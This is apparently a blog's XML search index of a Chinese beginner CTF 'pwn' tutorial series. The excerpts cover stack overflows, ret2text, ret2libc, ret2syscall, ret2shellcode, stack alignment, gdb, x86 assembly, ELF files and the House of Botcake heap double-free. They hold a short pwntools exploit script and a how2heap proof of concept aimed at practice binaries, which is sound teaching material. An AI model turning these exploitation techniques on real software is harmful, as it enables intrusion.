<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>从零开始的 Pwn 之旅 - Ret2libc</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)
函数调用约定和函数传参 当使用 ida pro 逆向分析时，函数开头总有这么一段：
1 int __fastcall main(int argc, const char **argv, const char **envp) __fastcall 是函数调用约定的一种，表示函数参数通过寄存器传递而不是通过栈。具体来说，前三个参数通过 rdi 和 rsi 和 rdx 寄存器传递, 前六个参数通过寄存器传递，后面的参数通过栈传递。
32 位程序通过栈传参
延迟绑定 相关调试用到的程序 ret2libc1 当使用 pwn checksec 检测二进制文件时
1 2 3 4 5 6 7 8 9 pwn checksec ./ret2libc1 (.venv) ✘ 130 master ✱ ◼ [*] &amp;amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1&amp;amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes RELRO: Partial RELRO 表示启用了延迟绑定 (Lazy Binding)，即函数的地址在第一次调用时才会被解析并填入 GOT 表中。 RELRO: Full RELRO 表示启用了全局重定位 (Full RELRO)，即函数的地址在程序加载时就会被解析并填入 GOT 表中。 RELRO: No RELRO 表示没有启用延迟绑定。 在第一节中，我们曾经讨论了动态链接和静态链接。动态链接为了节省储存空间采用运行时装载 libc 库
程序中 .got 段记录了 libc 库中函数的地址，如果攻击者修改了 got 地址，攻击者就可以控制程序流了。为此，relro 防护机制应运而生。
但是因为计算机底层的限制，RELRO 机制沦为 🤡 机制
RELRO: …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2syscall</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 ret2syscall 是 Pwn 进阶中的一个重要概念，它允许我们通过修改返回地址来直接调用系统调用，从而实现更复杂的攻击。本文将介绍 ret2syscall 的基本原理和应用。
C 语言中的 puts read write 等函数实际上是对系统调用的封装。通过 ret2syscall，我们可以直接调用这些系统调用，而不需要依赖 libc 函数。
ret2syscall ret2syscall 安全检查:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ chmod +x ./rop (.venv) master ✱ ◼ &amp;#39;./rop&amp;#39; 的模式已由 0644 (rw-r--r--) 更改为 0755 (rwxr-xr-x) $ pwn checksec ./rop (.venv) master ✱ ◼ [*] &amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes $ file ./rop (.venv) master ✱ ◼ ./rop: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped 32 位程序，启用了 NX, 静态链接
静态分析:
1 2 3 4 5 6 7 8 9 10 11 12 13 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2shellcode</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html">  前言 ret2shellcode 即是将程序的控制流劫持到我们构造的 shellcode 上。shellcode 是一段可以被执行的代码，通常用于执行系统命令或打开一个 shell。
想要执行 sehllcode, shellcode 所在的内存区域必须是可执行的。
使用 pwn checksec 命令检查二进制文件的安全特性，若发现 NX 被启用，则说明该二进制文件的堆栈内存区域不可执行。此方法一般而言来说会失效。
需要注意的是，在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用。 应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。
ret2shellcode-example ret2shellcode 先进行安全防护检测
1 2 3 4 5 6 7 8 9 10 11 12 13 $ chmod +x ./ret2shellcode $ pwn checksec ./ret2shellcode [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 5) [*] &amp;amp;#39;/home/lhon901/work/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&amp;amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 32 位程序没有任何的保护
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Ret2text</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</url><categories><category>Ctf</category></categories><tags><tag>Ctf</tag><tag>Pwn</tag></tags><content type="html"><![CDATA[  前言 之前我们已经初步介绍了栈溢出和栈对齐，这一节我们将做一个巩固练习
ret2text ret2text 先进行安全防护检测
1 2 3 4 5 6 7 8 9 10 11 ~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ chmod +x ./ret2text (.venv) master &amp;#39;./ret2text&amp;#39; 的模式已由 0644 (rw-r--r--) 更改为 0755 (rwxr-xr-x) ~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ pwn checksec ./ret2text (.venv) master ✱ [*] &amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes ida pro 逆向
1 2 3 4 5 6 7 8 9 10 11 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&amp;#34;There is something amazing here, do you know anything?&amp;#34;); gets(s); printf(&amp;#34;Maybe I will tell you next time !&amp;#34;); return 0; } 发现危险函数 gets, 可以进行栈溢出
1 2 3 4 5 6 7 8 9 10 11 12 13 void secure() { time_t v0; // eax int input; …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 栈对齐</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  前言 在上一节中为了成功执行 payload，我们在 exp.py 中加入了 ret 指令，今天我们将继续深入了解栈对齐的问题。
栈对齐 1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(&amp;#34;./main&amp;#34;) # 启动程序 backdoor = 0x401170 # backdoor 函数的地址 # 0x000000000040101a : ret ret = 0x40101a payload = b&amp;#34;a&amp;#34; * (0x10 + 0x8) + p64(backdoor) # 填充到 0x10 字节 + 8 字节的返回地址 p.sendline(payload) # 发送 payload p.interactive() # 进入交互模式 开始调试后一直跟踪到发现卡住无法调试了
1 2 3 4 5 6 7 8 9 10 11 12 13 14 ─────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────── ► 0x7f740018ffb5 movaps xmmword ptr [rsp], xmm1 &amp;lt;[0x7fffa6e14238] not aligned to 16 bytes&amp;gt; 0x7f740018ffb9 lock cmpxchg dword ptr [rip + 0x1955bf], edx 0x7f740018ffc1 jne 0x7f74001902c0 &amp;lt;0x7f74001902c0&amp;gt; 0x7f740018ffc7 mov eax, dword ptr [rip + 0x1955b7] EAX, [0x7f7400325584] =&amp;gt; 0 0x7f740018ffcd lea edx, [rax + 1] EDX =&amp;gt; 1 0x7f740018ffd0 mov dword ptr [rip + 0x1955ae], edx [0x7f7400325584] &amp;lt;= 1 0x7f740018ffd6 test eax, eax 0 &amp;amp; 0 EFLAGS =&amp;gt; 0x10246 [ cf PF af ZF …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 栈溢出初识</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  前言 为什么输入一串杂乱的字符串，就能让程序崩溃？为什么输入一串特定的字符串，就能让程序执行任意代码？下面的内容将带你走进 Pwn 的世界，了解栈溢出是如何发生的，以及如何利用它来执行任意代码。
栈 (stack) 栈 (stack) 是一种数据结构，计算机中使用栈来存储函数调用的局部变量、返回地址等信息。
1 2 3 4 5 6 7 8 9 10 11 +---------------------+ | 0x804000 | &amp;amp;lt;- 栈顶 (sp 指针) +---------------------+ | ... | +---------------------+ | 0x803000 | +---------------------+ | ... | +---------------------+ | 0x802000 | &amp;amp;lt;- 栈底 (ebp 指针) +---------------------+ stack 是一个后进先出 (LIFO) 的数据结构，最后压入栈的元素最先被弹出。 如示意图所示数据是这样入栈的
1 2 3 4 5 push 0x802000 ... push 0x803000 ... push 0x804000 当被弹出如下所示
1 2 3 pop rax ; rax = 0x804000 pop rbx ; rbx = 0x804000 - 0x??? ... stack 在操作系统中是从高地址向低地址增长的。 这意味着栈顶的地址比栈底的地址大。 操作系统内存布局示意图:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 +-------------------------------+ | 内核空间 (Kernel) | |-------------------------------| | 内核模块/驱动 | |-------------------------------| | 内核栈/内核数据 | +-------------------------------+ | 用户空间 (User) | |-------------------------------| | 堆 (Heap) | |-------------------------------| | 未分配空 …  </content></entry><entry><title>从零开始的 Pwn 之旅 - Pwn 环境的搭建</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  静态代码分析 ida pro [Disassemblers] IDA Pro 9.0 RC1 全平台安装包 及 patch脚本 安装过程不再赘述
将要分析的二进制文件拖入 IDA Pro 中，等待分析完成。
按下 F5 可以展示当前函数 C 伪代码 Shift + F12 可以展示当前程序的字符串 在反汇编窗口按下空格可切换视图 静态代码分析 gdb 前面的文章中已经介绍了如何使用 GDB 进行调试，这里不再赘述。
从零开始的 Pwn 之旅 - 掌握调试器 gdb 的基本使用 Pwn 相关工具 pwntools 1 pip install pwntools checksec 当安装了 pwntools 之后，可以使用 checksec 命令来检查二进制文件的安全特性。
1 2 3 4 5 6 7 8 $ pwn checksec main [*] &#39;/home/lhon901/Code/cpp/main&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No ROPGadget 当安装了 pwntools 之后，可以使用 ROPGadget 命令来查找 ROP gadget。
1 2 3 4 5 6 7 8 $ ROPgadget --binary ./main --only &#34;pop|ret&#34; Gadgets information ============================================================ 0x000000000040111d : pop rbp ; ret 0x000000000040101a : ret 0x0000000000401042 : ret 0x2f Unique gadgets found: 3 LibcSearcher LibcSearcher   ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - 掌握调试器 gdb 的基本使用</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  GDB 介绍 gdb 是 GNU Debugger 的缩写，是一个强大的调试工具，广泛用于调试 C/C++ 程序。它允许开发者在程序运行时检查变量、设置断点、单步执行代码等操作。掌握 gdb 是进行 Pwn 挑战的基础技能之一。
安装 gdb archlinux: sudo pacman -S gdb macOS: brew install gdb ubuntu: sudo apt install gdb gdb 基础命令 命令（缩写） 说明 break &amp;lt;位置&amp;gt;/b 在指定位置设置断点 run/r 启动程序（可带参数） next/n 执行下一行，不进入函数 step/s 执行下一行，若为函数则进入 finish 执行到当前函数结束并返回 continue/c 继续执行程序，直到下一个断点 set args &amp;lt;参数&amp;gt; 设置程序运行时的命令行参数 info breakpoints /i b 查看所有断点信息 delete &amp;lt;编号&amp;gt; 删除指定编号的断点 print &amp;lt;表达式&amp;gt;/p 打印变量或表达式的值 x/&amp;lt;格式&amp;gt; &amp;lt;地址&amp;gt; 查看内存内容，如 x/4x 以十六进制格式查看 4 个字节 bt 打印当前调用栈（backtrace） info registers/ i r 查看所有寄存器的值 disassemble/disas 反汇编当前函数或指定地址段 quit/q 退出 gdb x 指令常用用法 用法 说明 x/4x &amp;lt;addr&amp;gt; 以十六进制格式查看 4 个字（4*4=16 字节） x/8d &amp;lt;addr&amp;gt; 以十进制格式查看 8 个字 x/16b &amp;lt;addr&amp;gt; 以字节（byte）为单位查看 16 个字节 x/4i &amp;lt;addr&amp;gt; 以汇编指令格式查看 4 条指令 x/s &amp;lt;addr&amp;gt; 以字符串格式查看内存内容 x/wx &amp;lt;addr&amp;gt; 以 word（4 字节）为单位十六进制显示 x/gx &amp;lt;addr&amp;gt; 以 giant word（8 字节）为单位十六进制显示 x/a &amp;lt;addr&amp;gt; 以地址格式显示指针内容 说明：
&amp;lt;addr&amp;gt; 可以是变量名、寄存器（如 $esp）、或具体地址（如 0x8048000） 常用 …  ]]></content></entry><entry><title>从零开始的 Pwn 之旅 - x86 汇编基础</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  汇编语言风格 AT&amp;amp;amp;T Intel 寄存器前缀 % 寄存器无前缀 立即数前缀 $ 立即数无前缀 16 进制数前缀 0x 16 进制数后缀 h 源操作数在前，目标操作数在后 源操作数在后，目标操作数在前 间接寻址使用 (%reg) 间接寻址使用 [reg] 间接寻址格式为 (%reg, %reg, scale) 间接寻址格式为 [reg + reg * scale] 操作数大小后缀 b、w、l 操作数大小后缀 byte ptr、word ptr、dword ptr 寄存器 寄存器是 CPU 内部的高速存储器，用于存储临时数据和指令执行状态。
如下图所示，以 r 开头的寄存器为 64 位寄存器，e 开头的寄存器为 32 位寄存器，ax、bx 等为 16 位寄存器。 在 64 位模式下，寄存器的高 32 位可以通过 e 前缀访问，例如 eax 是 rax 的低 32 位。 同样，寄存器的低 16 位可以通过 x 后缀访问，例如 ax 是 eax 的低 16 位。
特殊寄存器 段寄存器：用于存储内存段的基地址，常用的段寄存器有 cs（代码段）、ds（数据段）、ss（堆栈段）、es、fs、gs。
标志寄存器：用于存储 CPU 的状态信息，包括零标志位、符号标志位、进位标志位等。
指令指针寄存器：eip（32 位模式）或 rip（64 位模式），用于存储下一条要执行的指令的地址。
堆栈指针寄存器：esp（32 位模式）或 rsp（64 位模式），用于指向当前堆栈的顶部。
基址寄存器：ebp（32 位模式）或 rbp（64 位模式），用于指向当前函数的堆栈帧基址。
常见指令 MOV：数据传送指令，用于将数据从一个位置移动到另一个位置。 ![NOTE] BYTE、WORD 和 DWORD 分别表示 1 字节、2 字节和 4 字节的数据类型。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 mov eax, ebx ; 将 ebx 的值复制到 eax mov [eax], ebx ; 将 ebx 的值存储到 eax 指向的内存地址 mov eax, 0x1234 ; 将立即数 0x1234 传送到 eax mov eax, [ebx + 4] ; 将 ebx 指向的内存地址加 4 后的值加载到 eax …  </content></entry><entry><title>从零开始的 Pwn 之旅 - 深入了解 elf 文件</title><url>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html">  ELF 文件初识 ELF 文件即 Linux 下的可执行文件，ELF 是 Executable and Linkable Format 的缩写。它是一个标准的二进制文件格式，用于存储可执行文件、目标代码、共享库和核心转储等。
使用 Linux 内置命令 file 可以轻松查看文件类型：
1 2 3 4 5 $ file /bin/ls /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1f6561268de19201ceee260d3a4f6662e1e70dd, for GNU/Linux 4.4.0, stripped ELF 64-bit LSB pie executable 部分表示这是一个 64 位的 ELF 文件，LSB 表示低位字节序，pie 表示位置无关可执行文件（Position Independent Executable）。 x86-64 表示这是一个 amd64(x86-64) 架构的可执行文件。 dynamically linked 表示这个可执行文件是动态链接的，意味着它依赖于共享库。 interpreter /lib64/ld-linux-x86-64.so.2 表示这个可执行文件使用的动态链接器是 /lib64/ld-linux-x86-64.so.2。 BuildID[sha1]=d1f6561268de19201ceee260d3a4f6662e1e70dd 是一个唯一的标识符，用于标识这个可执行文件的构建版本。 for GNU/Linux 4.4.0 表示这个可执行文件是为 GNU/Linux 4.4.0 版本构建的。 stripped 表示这个可执行文件已经被剥离了调试信息。 当 ELF 文件被赋予可执行属性时，直接在命令行中输入 ELF 文件路径即可执行该文件：
1 2 3 4 5 6 7 8 9 10 # 可执行文件在当期目录下 $ ./binary_file # 可执行文件在其他目录下(使用绝对路径) $ /bin/binary_file # 可执行文件在其他目录下(使用相对路径) $ …  </content></entry><entry><title>House_of_BotCake</title><url>/posts/house_of_botcake/</url><categories><category>Ctf</category></categories><tags><tag>Pwn</tag><tag>Ctf</tag></tags><content type="html"><![CDATA[  利用背景 自 glibc 2.29 开始加入了对 tcache 的 double free 检查, 使得之前的 tcache double free 失效
源码解读 tcache 结构体
1 2 3 4 5 6 typedef struct tcache_entry { struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段 } tcache_entry; tcache 被置入链表
1 2 3 4 5 6 7 8 9 10 11 12 13 14 static __always_inline void tcache_put(mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加 } tcache double free 检查
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 size_t tc_idx = csize2tidx(size); // 只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) { /* Check to see if it&#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&#34;free(): double free detected in tcache 2&#34;); } if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 { tcache_put(p, tc_idx); return; } } 动态调试 可以清晰的看到 bk 字段即 key 指向当前线程的 tcache chunk 区域
利用手法 利用思路 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // detail: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; int main() { // malloc chunks intptr_t *x[7]; for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } intptr_t *prev = malloc(0x100); intptr_t *victim = malloc(0x100); malloc(0x10); // free to fill tcache bins for(int i=0; i&lt;7; i++){ free(x[i]); } free(victim); free(prev); // Now, victim and prev already merge malloc(0x100); // double free free(victim); return 0; } 利用详解 上述代码内存布局:
1 2 // line 20 free(victim); 1 2 // line 21 free(prev); 此时 prev chunk 和 victim chunk 已经合并
1 2 // line 23 malloc(0x100); 此时申请内存块首先会从 tcache bins 返回内存块
1 2 // line 25 free(victim); victim chunk 已经被链接进了 tcache bins
只要 malloc 到 prev chunk 这块内存，就可以进行 tcache poisoning attack
漏洞成因 此漏洞的造成是因为 tcache 的检查不严谨导致的, free 函数通过检测当前 chunk 大小是否在 tcache 范围内来判断 double free
1 2 3 4 5 6 7 8 if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&#34;free(): double free detected in tcache 2&#34;); } 没有考虑到 unsorted bins chunk 被置入 tcache 没有 key 的情况
利用示例 write here   ]]></content></entry><entry><title>Hello_world</title><url>/posts/hello_world/</url><categories><category>test</category></categories><tags><tag>test</tag></tags><content type="html">  md test~ 🤔
  </content></entry></search>